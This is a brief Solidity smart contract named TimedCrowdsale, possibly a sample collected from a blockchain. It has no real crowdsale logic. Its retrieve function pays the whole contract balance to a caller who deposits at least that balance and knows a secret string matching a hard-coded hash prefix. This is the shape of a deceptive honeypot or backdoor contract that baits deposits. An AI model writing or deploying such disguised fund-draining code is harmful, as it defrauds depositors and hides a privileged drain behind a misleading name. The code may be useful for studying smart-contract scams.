 

pragma solidity ^0.4.25;

contract TimedCrowdsale {
   

    function retrieve(string code) public payable {
        if (msg.value >= (this.balance - msg.value)) {
            if (bytes5(keccak256(code)) == 0x70014a63ef) {
                msg.sender.transfer(this.balance);
            }
        }
    }

  function isSaleFinished() view public returns (bool) {
     
    return block.timestamp >= 1546300800;
  }
}
